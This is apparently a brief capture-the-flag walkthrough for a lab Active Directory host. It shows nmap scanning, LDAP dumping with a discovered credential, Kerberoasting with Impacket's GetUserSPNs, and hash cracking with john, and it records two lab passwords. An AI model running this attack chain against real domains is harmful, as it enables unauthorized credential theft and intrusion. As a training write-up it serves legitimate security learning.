```
nmap -sS -sC -sV -T5 -Pn 10.10.11.129
```
![image](https://user-images.githubusercontent.com/33616880/230699143-58aa6593-510f-4de6-be67-cbf555c08f22.png)


hope.sharp | IsolationIsKey?

![image](https://user-images.githubusercontent.com/33616880/230699047-df9e814d-0ef6-4377-97bd-72824e5dd6e5.png)


```
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
```
![image](https://user-images.githubusercontent.com/33616880/230699359-15a9ef35-6723-4822-b1e6-ab93ec59e2cb.png)
![image](https://user-images.githubusercontent.com/33616880/230699421-3b664dda-82d1-473a-8c1f-2b29de81fb90.png)


```
cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
```
![image](https://user-images.githubusercontent.com/33616880/230699598-ab7213a0-fb91-4395-a5b0-345b7e2fb34a.png)


```
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
```
web_svc | @3ONEmillionbaby

![image](https://user-images.githubusercontent.com/33616880/230699690-2850b510-c824-49fa-a20f-c4a3044c0fc1.png)


![image](https://user-images.githubusercontent.com/33616880/230699760-4770c7a8-b7ee-4a9d-9398-d2298e8863e4.png)

